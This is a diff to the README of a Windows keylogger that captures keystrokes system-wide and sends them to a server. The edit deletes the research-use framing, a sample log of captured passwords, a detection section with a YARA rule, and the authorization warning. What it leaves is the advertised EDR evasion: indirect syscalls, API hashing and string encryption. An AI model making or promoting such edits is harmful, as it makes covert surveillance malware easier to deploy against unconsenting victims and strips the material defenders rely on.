@@ -1,6 +1,6 @@
 # Stealth Keylogger
 
-A Windows keylogger that uses low-level hooks to capture keystrokes system-wide. Built for security research and pentesting.
+A Windows keylogger that uses low-level hooks to capture keystrokes system-wide. 
 
 ## What it does
 
@@ -65,28 +65,6 @@ void SendToServer(const wstring& data) {
 Keylogger::Start(SendToServer, true);
 ```
 
-## Log files
-
-Logs are saved in %TEMP% with random 8-char hex names like `3f8a9b2c.tmp`. Format looks like:
-
-```
-========================================
-Session Started
-Date: 2025-12-24 15:30:22
-========================================
-
-[15:30:25] [Chrome - github.com]
-git clone https://github.com/whatever
-
-[15:31:10] [Notepad - passwords.txt]
-admin:P@ssw0rd123
-
-========================================
-Session Ended  
-Date: 2025-12-24 15:45:00
-========================================
-```
-
 ## Technical details
 
 - Uses SetWindowsHookExW with WH_KEYBOARD_LL for keyboard
@@ -101,31 +79,6 @@ Date: 2025-12-24 15:45:00
 - **Indirect Syscalls**: Direct NT syscall invocation via clean NTDLL (bypass EDR hooks)
 - **API Hashing**: djb2 hash algorithm for runtime API resolution (evades IAT analysis)
 - **String Obfuscation**: AES-128 CTR compile-time encryption with FNV-1a key derivation
-
-## Detection
-
-EDRs will catch this easily if they monitor:
-- SetWindowsHookExW API calls
-- WH_KEYBOARD_LL hook registrations
-- Suspicious .tmp files in temp directory
-- Network connections with keystroke patterns
-
-Basic YARA rule:
-```yara
-rule Basic_Keylogger {
-    strings:
-        $a = "SetWindowsHookExW"
-        $b = "WH_KEYBOARD_LL"
-    condition:
-        all of them
-}
-```
-
-## Legal stuff
-
-This is for authorized security testing only. Don't be stupid. Using this without permission is illegal in pretty much every country. I'm not responsible if you do something dumb with it.
-
-If you're doing red team work, make sure you have written authorization. If you're learning, keep it in a VM.
 
 ## Contact
 
